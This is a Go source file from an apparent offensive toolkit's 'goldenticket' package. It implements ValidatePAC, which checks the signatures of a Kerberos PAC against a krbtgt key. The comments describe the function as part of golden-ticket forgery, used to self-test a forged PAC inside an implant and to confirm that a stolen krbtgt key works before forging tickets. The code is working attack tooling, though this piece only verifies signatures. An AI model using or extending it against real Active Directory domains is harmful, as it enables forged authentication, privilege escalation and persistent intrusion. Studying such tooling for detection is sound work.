package goldenticket

import (
	"crypto/hmac"
	"errors"
	"fmt"

	"github.com/oioio-space/maldev/internal/msrpc/msrpc/pac"
)

// PAC validation sentinels — errors.Is-friendly so callers can route
// on the failure mode rather than parsing strings.
var (
	// ErrPACMissingServerSignature is returned by [ValidatePAC] when
	// the parsed PAC has no server-checksum buffer (type 0x06).
	ErrPACMissingServerSignature = errors.New("goldenticket: PAC missing server signature buffer")

	// ErrPACMissingKDCSignature is returned by [ValidatePAC] when
	// the parsed PAC has no KDC-checksum buffer (type 0x07).
	ErrPACMissingKDCSignature = errors.New("goldenticket: PAC missing KDC signature buffer")

	// ErrInvalidServerSignature is returned by [ValidatePAC] when
	// the server-checksum bytes do not match the expected HMAC over
	// the zeroed PAC computed with the supplied krbtgt key. Most
	// common cause: wrong key etype, wrong key bytes, or a tampered
	// PAC body.
	ErrInvalidServerSignature = errors.New("goldenticket: PAC server signature mismatch")

	// ErrInvalidKDCSignature is returned by [ValidatePAC] when the
	// KDC-checksum bytes do not match the expected HMAC over the
	// server-signature bytes. Most common cause: a tampered PAC where
	// the operator forged a server signature but left the KDC
	// signature stale.
	ErrInvalidKDCSignature = errors.New("goldenticket: PAC KDC signature mismatch")
)

// ValidatePAC verifies the server + KDC signatures embedded in
// pacBytes against the supplied krbtgt key, mirroring MS-PAC §2.8's
// signature dance in reverse:
//
//  1. Parse the PAC + locate the server / KDC signature buffers.
//  2. Save the current signature bytes.
//  3. Zero both signatures in a working copy.
//  4. Recompute the server checksum over the zeroed bytes and
//     compare against the saved server signature.
//  5. Recompute the KDC checksum over the saved server-signature
//     bytes and compare against the saved KDC signature.
//
// Returns nil when both match (the PAC is internally consistent and
// was minted by a holder of the krbtgt key for the given etype).
// Returns one of the four sentinel errors above on signature
// mismatch, or a wrapped error for parse / FSCTL failures.
//
// Use cases:
//
//   - Round-trip self-test: forge a PAC, validate it, confirm both
//     halves agree on the algorithm before the kirbi ever leaves
//     the implant.
//   - Operator pre-flight: validate a captured-from-DC PAC against
//     a stolen krbtgt key to confirm the key works before forging.
//   - Detection-engineering training: an implant validates its OWN
//     forged PAC to assert the blue team's verification path would
//     accept it (defensive sanity check before submission).
//
// h must carry the krbtgt's secret + correct etype. The function
// uses [hmac.Equal] for the comparison — constant-time where it
// matters defensively, even though the PAC itself is operator-
// controlled and the timing surface here is local.
//
// Limitations:
//
//   - TicketChecksum (type 0x10) and ExtendedKDCChecksum (type
//     0x13) are NOT validated. Most golden tickets don't carry
//     them; their inclusion is a 2022+ Kerberos hardening concern
//     out of scope for the current `Forge` path.
//   - Logical PAC validity (well-formed UNICODE_STRING fields,
//     plausible RIDs, group-membership coherence) is the consumer's
//     concern. ValidatePAC only verifies the cryptographic
//     signatures.
func ValidatePAC(pacBytes []byte, h Hash) error {
	if len(pacBytes) == 0 {
		return fmt.Errorf("goldenticket: empty PAC bytes")
	}

	var p pac.PAC
	if err := p.Unmarshal(pacBytes); err != nil {
		return fmt.Errorf("goldenticket: parse PAC: %w", err)
	}

	var serverBuf, kdcBuf *pac.PACInfoBuffer
	for _, b := range p.Buffers {
		switch b.Type {
		case pacInfoBufferTypeServerChecksum:
			serverBuf = b
		case pacInfoBufferTypeKDCChecksum:
			kdcBuf = b
		}
	}
	if serverBuf == nil {
		return ErrPACMissingServerSignature
	}
	if kdcBuf == nil {
		return ErrPACMissingKDCSignature
	}
	if p.ServerChecksum == nil || p.KDCChecksum == nil {
		// Defensive — Unmarshal should populate these whenever the
		// buffers are present, but guard against vendored-stack drift.
		return fmt.Errorf("goldenticket: PAC parser produced no PACSignatureData")
	}

	// p.ServerChecksum / p.KDCChecksum are independent allocations
	// produced by ndr.Unmarshal — they don't alias pacBytes, so we
	// can read them directly without a defensive copy.
	serverSig := p.ServerChecksum.Signature
	kdcSig := p.KDCChecksum.Signature

	// pac.ZeroOutSignatureData mutates its first argument in place;
	// clone pacBytes so the caller's buffer stays untouched.
	work := append([]byte(nil), pacBytes...)
	var err error
	if work, err = pac.ZeroOutSignatureData(work, serverBuf); err != nil {
		return fmt.Errorf("goldenticket: zero server sig: %w", err)
	}
	if work, err = pac.ZeroOutSignatureData(work, kdcBuf); err != nil {
		return fmt.Errorf("goldenticket: zero kdc sig: %w", err)
	}

	expectedServerSig, err := pacChecksum(h, work)
	if err != nil {
		return fmt.Errorf("goldenticket: compute server checksum: %w", err)
	}
	if !hmac.Equal(serverSig, expectedServerSig) {
		return ErrInvalidServerSignature
	}

	expectedKDCSig, err := pacChecksum(h, serverSig)
	if err != nil {
		return fmt.Errorf("goldenticket: compute kdc checksum: %w", err)
	}
	if !hmac.Equal(kdcSig, expectedKDCSig) {
		return ErrInvalidKDCSignature
	}

	return nil
}
